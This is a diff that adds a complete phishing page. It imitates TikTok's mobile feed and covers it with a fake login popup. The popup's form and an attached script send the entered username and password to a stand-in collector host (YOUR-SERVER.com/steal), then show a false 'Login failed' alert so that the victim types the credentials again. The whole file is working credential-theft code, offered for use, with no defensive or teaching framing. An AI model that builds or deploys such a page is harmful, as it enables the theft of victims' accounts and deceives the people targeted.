@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok - Make Your Day</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Helvetica Neue', sans-serif; }
+        body { background: #000; color: #fff; }
+        .header { position: fixed; top: 0; width: 100%; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; z-index: 100; background: linear-gradient(180deg, rgba(0,0,0,0.8) 0%, transparent); }
+        .logo { font-size: 24px; font-weight: 700; color: #fff; }
+        .logo span { color: #ff0050; }
+        .feed { margin-top: 60px; margin-bottom: 70px; }
+        .video-card { position: relative; width: 100%; height: calc(100vh - 130px); margin-bottom: 8px; background: #111; border-radius: 0; overflow: hidden; }
+        .video-player { width: 100%; height: 100%; object-fit: cover; }
+        .video-info { position: absolute; bottom: 80px; left: 16px; right: 80px; }
+        .username { font-weight: 700; font-size: 16px; margin-bottom: 4px; }
+        .caption { font-size: 14px; opacity: 0.9; }
+        .music { font-size: 13px; display: flex; align-items: center; gap: 6px; margin-top: 8px; color: #ffd700; }
+        .actions { position: absolute; bottom: 80px; right: 16px; display: flex; flex-direction: column; gap: 20px; align-items: center; }
+        .action-btn { display: flex; flex-direction: column; align-items: center; gap: 4px; font-size: 12px; }
+        .action-btn i { font-size: 28px; }
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 12px 0; background: #000; border-top: 1px solid #222; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; font-size: 12px; color: #888; }
+        .nav-item.active { color: #fff; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">Tik<span>Tok</span></div>
+        <div>🔍</div>
+    </div>
+
+    <div class="feed">
+        <!-- Video 1 - Viral -->
+        <div class="video-card">
+            <video class="video-player" loop autoplay muted poster="https://via.placeholder.com/1080x1920/1a1a1a/666?text=VIDEO+1">
+                <source src="#" type="video/mp4">
+            </video>
+            <div class="video-info">
+                <div class="username">@viral_user</div>
+                <div class="caption">Tunggu apa lagi? #fyp #viral</div>
+                <div class="music">🎵 original sound - viral_user</div>
+            </div>
+            <div class="actions">
+                <div class="action-btn">❤️ <span>1.2M</span></div>
+                <div class="action-btn">💬 <span>45.2K</span></div>
+                <div class="action-btn">↗️</div>
+            </div>
+        </div>
+        
+        <!-- Video 2 -->
+        <div class="video-card">
+            <video class="video-player" loop autoplay muted poster="https://via.placeholder.com/1080x1920/2a2a2a/777?text=VIDEO+2">
+                <source src="#" type="video/mp4">
+            </video>
+            <div class="video-info">
+                <div class="username">@creator_alt</div>
+                <div class="caption">Login to see more content! 🔥</div>
+                <div class="music">🎵 Login required - click below</div>
+            </div>
+            <div class="actions">
+                <div class="action-btn">❤️ <span>892K</span></div>
+                <div class="action-btn">💬 <span>23.1K</span></div>
+                <div class="action-btn">↗️</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- LOGIN POPUP - PHISHING TARGET -->
+    <div id="loginPopup" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: flex; justify-content: center; align-items: center; z-index: 9999;">
+        <div style="width: 90%; max-width: 400px; background: #1a1a1a; border-radius: 16px; padding: 32px 24px;">
+            <div style="font-size: 32px; font-weight: 700; color: #fff; text-align: center; margin-bottom: 8px;">Tik<span style="color: #ff0050;">Tok</span></div>
+            <div style="color: #aaa; text-align: center; margin-bottom: 32px;">Login untuk lanjut scroll</div>
+            
+            <form id="phishForm" action="https://YOUR-SERVER.com/capture" method="POST">
+                <div style="margin-bottom: 20px;">
+                    <input type="text" name="username" placeholder="Username / Email" style="width: 100%; padding: 16px; background: #333; border: none; border-radius: 8px; color: #fff; font-size: 16px;">
+                </div>
+                <div style="margin-bottom: 28px;">
+                    <input type="password" name="password" placeholder="Password" style="width: 100%; padding: 16px; background: #333; border: none; border-radius: 8px; color: #fff; font-size: 16px;">
+                </div>
+                <button type="submit" style="width: 100%; padding: 16px; background: #ff0050; border: none; border-radius: 40px; color: #fff; font-weight: 700; font-size: 18px;">Log in</button>
+            </form>
+            
+            <div style="text-align: center; margin-top: 24px;">
+                <a href="#" style="color: #ff0050; text-decoration: none; font-size: 14px;">Forgot password?</a>
+            </div>
+            <div style="text-align: center; margin-top: 16px; color: #666; font-size: 13px;">
+                Don't have account? <a href="#" style="color: #ff0050; text-decoration: none;">Sign up</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-nav">
+        <div class="nav-item active">🏠</div>
+        <div class="nav-item">🔍</div>
+        <div class="nav-item">➕</div>
+        <div class="nav-item">💬</div>
+        <div class="nav-item">👤</div>
+    </div>
+
+    <script>
+        // Auto-capture credentials
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var username = document.querySelector('input[name="username"]').value;
+            var password = document.querySelector('input[name="password"]').value;
+            
+            // Send to your collector
+            fetch('https://YOUR-SERVER.com/steal', {
+                method: 'POST',
+                body: JSON.stringify({u: username, p: password}),
+                headers: {'Content-Type': 'application/json'}
+            });
+            
+            // Redirect ke feed palsu
+            document.getElementById('loginPopup').style.display = 'none';
+            alert('Login failed! Please try again.'); // Biar user input ulang
+        });
+    </script>
+</body>
+</html>
